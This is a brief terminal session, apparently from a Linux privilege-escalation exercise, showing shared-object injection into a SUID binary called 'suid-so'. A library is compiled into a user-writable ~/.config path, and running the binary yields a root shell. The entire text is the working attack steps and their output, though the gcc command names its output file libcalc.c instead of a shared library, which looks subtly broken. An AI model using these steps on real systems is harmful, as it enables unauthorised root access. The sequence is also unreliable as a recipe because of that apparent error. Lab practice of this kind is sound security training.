```
$ ls -la /usr/local/bin/suid-so
$ mkdir /home/user/.config
$ gcc -shared -fPIC -o /home/user/.config/libcalc.c /home/user/libcalc.c
$ /usr/local/bin/suid-so
# id 
root
```
